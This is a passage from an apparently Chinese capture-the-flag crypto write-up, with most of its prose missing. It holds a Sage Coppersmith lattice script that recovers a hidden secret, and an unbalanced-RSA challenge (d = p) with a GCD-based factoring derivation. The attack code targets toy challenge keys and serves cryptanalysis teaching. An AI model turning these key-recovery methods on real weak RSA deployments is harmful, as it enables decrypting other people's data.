mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo></mo><mn>1</mn></mrow></msup><mo></mo><msup><mi>B</mi><mrow><mo></mo><mn>1</mn></mrow></msup><mo></mo><mo stretchy="false">(</mo><msub><mi>r</mi><mn>1</mn></msub><mo></mo><msub><mi>r</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">A^{-1}-B^{-1}\equiv (r_{1}-r_{2})\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext></mtext></mrow><annotation encoding="application/x-tex"></annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span><span class="mord cjk_fallback"></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo></mo><mn>1</mn></mrow></msup><mo></mo><msup><mi>B</mi><mrow><mo></mo><mn>1</mn></mrow></msup><mo>=</mo><mfrac><mrow><mi>B</mi><mo></mo><mi>A</mi></mrow><mrow><mi>A</mi><mi>B</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">A^{-1}-B^{-1}=\frac{B-A}{AB}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">A</span><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">A</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>A</mi><mi>B</mi><mo stretchy="false">(</mo><msub><mi>r</mi><mn>1</mn></msub><mo></mo><mi>r</mi><mn>2</mn><mo stretchy="false">)</mo><mo></mo><mi>B</mi><mo>+</mo><mi>A</mi><mo></mo><mn>0</mn><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">f(x,y)=AB(r_{1}-r{2})-B+A\equiv 0\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord"><span class="mord">2</span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><msub><mi>b</mi><mn>1</mn></msub><mo separator="true">,</mo><mi>y</mi><mo>=</mo><msub><mi>b</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">x=b_{1},y=b_{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mo></mo><msup><mi>A</mi><mrow><mo></mo><mn>1</mn></mrow></msup><mo></mo><msub><mi>r</mi><mn>1</mn></msub><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">s\equiv A^{-1}-r_{1}\ mod\ p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.897438em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"></span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s"></span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">p</span></span></span></span></p><p></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = <span class="type">Sequence</span>([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m + <span class="number">1</span>):</span><br><span class="line">        base = N ^ (m - i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = base * prod(<span class="built_in">map</span>(power, f.variables(), shifts))</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span> / factor)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, B * monomials):</span><br><span class="line">        H.append(h)</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            roots = []</span><br><span class="line">            <span class="keyword">for</span> root <span class="keyword">in</span> I.variety(ring=ZZ):</span><br><span class="line">                root = <span class="built_in">tuple</span>(R(root[var]) <span class="keyword">for</span> var <span class="keyword">in</span> f.variables())</span><br><span class="line">                roots.append(root)</span><br><span class="line">            <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">p = <span class="number">151530040749164553403967983518843577352864270263889106337011110378601036680690471836027157653547709937519393960972849334865341611877035904693178333416457975524708748243011699123245181968472855540946305680746439921799620880630731896672163604054069337581059081562076860588954007665828525502756791219539357191539</span></span><br><span class="line">d1 = <span class="number">50083234780783999664902204148367665654965860210705806460611800714011984032825099659257301169981655933116226437075588050862473758014777833755744093767631735454786283542732504816602375269658543953884652005423131768292669188376398437788186070246006877324243974392923640712035990908502571083697320506587058057087</span></span><br><span class="line">d2 = <span class="number">91453105340363659854895114107811465809020665893141480802534401849670186432558336798544994184391985650330332142766844489480723736690400200157100330182955996913526651749892519448150014139485635391932575239621990448927615793198397632259445575664911965643266433167901384050043834029621593534439503767913891826664</span></span><br><span class="line">r1 = <span class="number">7100211561130020745317757673987451075767374867154791943756942873384127138552062792930795789238580479594394979173335338862606838173069964831049512647184151</span></span><br><span class="line">r2 = <span class="number">9000155708454100491902006607890753523170880329077738766151247940110441586305244492413508062919425173224196956216820961804625696491943075045460554703545531</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x,y&gt; = PolynomialRing(Zmod(p))</span><br><span class="line">f = (r1-r2)*(d1+x)*(d2+y)-(d2-d1)-(y-x)</span><br><span class="line">res = small_roots(f, (<span class="number">2</span>^<span class="number">246</span>,<span class="number">2</span>^<span class="number">246</span>),m=<span class="number">1</span>,d=<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    b1,b2 = root</span><br><span class="line">    s=(inverse(d1+b1,p)-r1)%p</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(s)).decode())</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="-i"><a class="markdownIt-Anchor" href="#-i"></a>  </h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"><span class="keyword">assert</span> m.bit_length() &lt; <span class="number">512</span></span><br><span class="line">N = <span class="number">1024</span></span><br><span class="line">P = <span class="number">256</span></span><br><span class="line">p = getPrime(P)</span><br><span class="line">q = getPrime(N-P)</span><br><span class="line">n = p * q</span><br><span class="line">d = p</span><br><span class="line">e = inverse(d, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 118542873900747265901972229877883243863455720266210015956664954705111625457638899855027122945522479781037404808597170399339837193705757680088860677997958907356598337673929983523887709805385841477614948436454673040596579313465066950050748901502261100925866106567136278276272183814389727065752049737673528788851</span></span><br><span class="line"><span class="string">c = 85091710660465995062917932706421029612933738881922031822674968124253137988309351810508978584348197911485561426918031817399685522559286375310408913518074664331882588344176796591922444160725511070449908851983275493777666568865120499654769828318792734657142197271358769027319683651960777955741591424859221331570</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><code>coppersmith</code><br /><a href="https://jayxv.github.io/2020/08/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8Bcoppersmith/">https://jayxv.github.io/2020/08/13/coppersmith/</a><br /><code>boneh durfee attack</code><code>e</code><br /><a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage">https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</a></p><p><code>Lazzaro</code><a href="https://www.cnblogs.com/404p3rs0n/p/15542587.html">https://www.cnblogs.com/404p3rs0n/p/15542587.html</a><br /></p><p><code>unbalanced rsa</code><code>d=p</code><a href="https://blog.maple3142.net/2021/12/07/hitcon-ctf-2021-writeups/#a-little-easy-rsa"></a><br /><code>e</code><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo></mo><mi>n</mi><mo></mo><mi>e</mi><mo></mo><mi>p</mi><mo></mo><mi>q</mi><mo></mo><mi>q</mi><mo></mo><mi>e</mi><mo></mo><mi>d</mi><mo></mo><mi>q</mi><mo></mo><mi>q</mi><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi></mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">e*n\equiv e*p*q\equiv q\equiv e*d*q\equiv q\ mod\ \phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46375em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65819em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65819em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">d</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.65819em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal"></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>e</mi><mo></mo><mi>n</mi></mrow></msup><mo></mo><msup><mn>2</mn><mi>q</mi></msup><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>n</mi></mrow><annotation encoding="application/x-tex">2^{e*n}\equiv 2^{q}\ mod\ n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal">n</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mrow><mi>e</mi><mo></mo><mi>n</mi></mrow></msup><mo></mo><msup><mn>2</mn><mi>q</mi></msup><mo></mo><mn>2</mn><mtext></mtext><mi>m</mi><mi>o</mi><mi>d</mi><mtext></mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">2^{e*n}\equiv 2^{q}\equiv 2\ mod\ q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mbin mtight"></span><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.664392em;vertical-align:0em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">2</span><span class="mspace"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mspace"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span><br /><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi><mo>=</mo><mi>G</mi><mi>C</mi><mi>D</mi><mo stretchy="false">(</mo><msup><mn>2</mn><mrow><mi>e</mi><mo></mo><mi>n</mi></mrow></msup><mo></mo><mn>2</mn><mo separator="true">,</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">q=GCD(2^{e*n}-2,n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">G</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord mathnormal" style="margin-right:0.02778em;">D</span><span 